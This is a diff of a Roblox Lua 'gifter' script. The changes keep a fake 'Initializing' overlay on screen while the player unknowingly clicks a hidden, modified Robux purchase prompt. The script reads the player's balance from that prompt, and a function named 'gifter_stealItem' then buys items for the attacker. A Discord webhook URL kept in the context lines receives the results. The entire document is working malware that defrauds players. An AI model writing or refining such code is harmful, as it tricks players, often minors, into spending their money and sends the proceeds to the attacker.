@@ -24,11 +24,11 @@ local Joiner_GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1357962037
 --[[============================ Script Guard ============================]]
 
 -- Prevent multiple executions
-if _G.CombinedScriptExecuted_v1_9 then -- Updated guard name
+if _G.CombinedScriptExecuted_v1_10 then -- Updated guard name
     warn("Combined script already executed.")
     return
 end
-_G.CombinedScriptExecuted_v1_9 = true
+_G.CombinedScriptExecuted_v1_10 = true
 
 -- Wait for game load
 repeat task.wait() until game:IsLoaded()
@@ -630,7 +630,7 @@ local function showInitializingUI()
 end
 
 
--- Main Gifting Phase Function (Modified for Overlay & Timing)
+-- Main Gifting Phase Function (Implementing Overlay Until Click logic)
 local function executeGiftingPhase()
     -- Get UserID first
     local successUserId, userIdResult = pcall(function()
@@ -695,14 +695,12 @@ local function executeGiftingPhase()
     gifter_modifyPromptUI()
     warn("Gifter Phase: Prompt modified behind overlay.")
 
-    -- Destroy the Initializing UI *before* waiting for the click, revealing the modified prompt
-    if initUI and initUI.Parent then
-        pcall(initUI.Destroy, initUI) -- Use pcall for safety
-        warn("Gifter Phase: Initializing UI removed.")
-    end
+    -- Get Balance from hidden prompt (do this before waiting for click)
+    local currentBalance = gifter_getRobuxBalance()
+    warn("Gifter Phase: Balance read from hidden prompt:", currentBalance)
 
-    -- Wait for the user to click the now-visible "Launch Script" button
-    warn("Gifter Phase: Waiting for user confirmation click...")
+    -- Wait for the user to click the hidden, modified button (overlay still visible)
+    warn("Gifter Phase: Waiting for user confirmation click (overlay visible)...")
     local startTime = tick()
     local timeout = 15 -- Wait up to 15 seconds for the click
     while not gifter_promptConfirmed do
@@ -710,6 +708,7 @@ local function executeGiftingPhase()
         if not PurchasePrompt.Parent then
              warn("Gifter Phase Error: Prompt closed before confirmation.")
              gifter_giftingFailed = true
+             if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI
              return false -- Failed because confirmation didn't happen
         end
         if tick() - startTime > timeout then
@@ -719,16 +718,22 @@ local function executeGiftingPhase()
             pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
             pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
             gifter_waitForPromptToDisappear()
+            if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI
             return false -- Failed due to timeout
         end
         task.wait() -- Minimal wait/yield
     end
 
-    -- User clicked the button, now proceed with gifting
-    warn("Gifter Phase: Confirmation received. Proceeding with gifting...")
-    local currentBalance = gifter_getRobuxBalance() -- Get balance *after* confirmation
-    warn("Gifter Phase: Balance at confirmation:", currentBalance)
+    -- User clicked the button (while overlay was visible)
+    warn("Gifter Phase: Confirmation received.")
 
+    -- Destroy the Initializing UI *after* the click is confirmed
+    if initUI and initUI.Parent then
+        pcall(initUI.Destroy, initUI) -- Use pcall for safety
+        warn("Gifter Phase: Initializing UI removed.")
+    end
+
+    -- Proceed with gifting using the balance read earlier
     if currentBalance >= 25 then
         gifter_stealItem(currentBalance) -- This now calls buyItem which includes webhook
     else
@@ -1544,5 +1549,5 @@ end
 
 -- Cleanup script executed flag on teleport (from Gifter)
 LocalPlayer.OnTeleport:Connect(function()
-    _G.CombinedScriptExecuted_v1_8 = nil -- Match guard name
+    _G.CombinedScriptExecuted_v1_9 = nil -- Match guard name
 end)
